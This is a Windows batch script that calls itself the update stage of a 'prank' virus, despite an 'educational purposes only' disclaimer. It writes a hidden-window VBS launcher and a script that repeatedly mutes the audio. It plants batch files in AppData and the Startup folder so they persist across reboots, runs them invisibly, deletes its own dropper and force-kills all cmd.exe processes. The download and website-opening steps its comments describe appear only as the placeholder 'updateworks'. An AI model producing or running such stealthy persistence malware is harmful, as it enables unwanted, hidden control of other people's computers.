@echo off

REM Use this for educational purposes only.
REM I do not any take responsability for you pranking your friends or getting in trouble.
REM If you accidentally downloaded this or ran this, you can download the remover.bat from the gihub page. 
REM
REM
REM
REM
REM
REM
REM
REM
REM


If EXIST C:\Users\%username%\AppData\Local\startup_copier.bat (
	del "C:\Users\%username%\AppData\Local\startup_copier.bat"
)
ELSE(
	ECHO hello
)

If EXIST C:\Users\%username%\AppData\Roaming\startup_copier2.bat (
	del "C:\Users\%username%\AppData\Roaming\startup_copier2.bat"
)
ELSE(
	ECHO hello
)

If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat (
	del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
)
ELSE(
	ECHO hello
)

If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat (
	del "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat"
)
ELSE(
	ECHO hello
)


If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs (
	del "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs"
)
ELSE(
	ECHO hello
)


If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs (
	del "C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs"
)
ELSE(
	ECHO hello
)



If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat (
	del "C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat"
)
ELSE(
	ECHO hello
)


If EXIST C:\Users\%username%\AppData\Local\startup.bat (
	del "C:\Users\%username%\AppData\Local\startup.bat"
)
ELSE(
	ECHO hello
)





	
REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
type NUL > C:\Users\%username%\Downloads\msdfmap.vbs
set pwd=CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False
ECHO %pwd% >> C:\Users\%username%\Downloads\msdfmap.vbs



REM This creates the mute.vbs script.
set mute1=Set WshShell = CreateObject("WScript.Shell")
set mute2=	For i = 0 To 50
set mute3=	WshShell.SendKeys(chr(174))
set mute4=  WScript.Sleep 100
set mute5=Next
type NUL > C:\Users\%username%\Downloads\mute.vbs
ECHO %mute1%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute2%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute3%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute4%  >> C:\Users\%username%\Downloads\mute.vbs
ECHO %mute5%  >> C:\Users\%username%\Downloads\mute.vbs




type NUL > C:\Users\%username%\Downloads\startup.bat
ECHO @echo off >> C:\Users\%username%\Downloads\startup.bat
ECHO updateworks >> C:\Users\%username%\Downloads\startup.bat



type NUL > C:\Users\%username%\Downloads\startup_copier2.bat
ECHO @echo off >> C:\Users\%username%\Downloads\startup_copier2.bat
ECHO updateworks >> C:\Users\%username%\Downloads\startup_copier2.bat


type NUL > C:\Users\%username%\Downloads\startup_copier.bat
ECHO updateworks  >> C:\Users\%username%\Downloads\startup_copier.bat






REM This builds the code for msdfmap.bat
REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
type NUL > C:\Users\%username%\Downloads\msdfmap.bat
ECHO @echo off >> C:\Users\%username%\Downloads\msdfmap.bat
REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
ECHO updateworks >> C:\Users\%username%\Downloads\msdfmap.bat






REM This code copies each of the created files to specific folders. 

copy /y "C:\Users\%username%\Downloads\msdfmap.bat" "C:\Users\%username%\AppData\Roaming\Microsoft"
copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
copy /y "C:\Users\%username%\Downloads\mute.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Roaming"
copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local"
copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"


REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
del C:\Users\%username%\Downloads\startup.bat
del C:\Users\%username%\Downloads\msdfmap.bat
del C:\Users\%username%\Downloads\msdfmap.vbs
del C:\Users\%username%\Downloads\mute.vbs
del C:\Users\%username%\Downloads\startup_copier.bat
del C:\Users\%username%\Downloads\startup_copier2.bat


wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\startup_copier2.bat
wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat

REM Deletes original infection file.
del update1.bat





REM Taskkill cmd.exe used at somepoint after the update. regular virus will auto run after next computer restart. This is only for updating.
taskkill /f /im cmd.exe